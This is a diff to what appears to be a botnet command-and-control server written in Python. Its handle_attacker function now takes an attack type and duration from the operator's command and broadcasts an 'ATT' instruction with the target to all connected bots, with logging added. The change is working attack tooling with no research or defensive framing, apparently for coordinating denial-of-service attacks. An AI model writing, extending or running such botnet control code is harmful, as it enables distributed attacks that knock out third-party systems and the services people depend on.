@@ -80,12 +80,23 @@ def handle_attacker(conn):
                 continue
 
             target = parts[1]
+            type_att = 1
+            duration = 10
+            print(target, type_att, duration)
+
+            if len(parts) == 3:
+                type_att= parts[2]
+            elif len(parts) == 4:
+                type_att=parts[2]
+                duration = parts[3]
 
             for bot in bots:
                 try:
-                    bot.send(f"ATT {target}\n".encode())
-                except:
-                    pass
+                    bot.sendall(f"ATT {target} {type_att} {duration}\n".encode())
+                    print(f"ATT {target} {type_att} {duration}\n")
+                    #bot.send(f"ATT {target} {att_type} {duration}\n".encode())
+                except Exception as e:
+                    print(f"Sending error: {e}")
 
             conn.send(b"Attack sent\n")
 
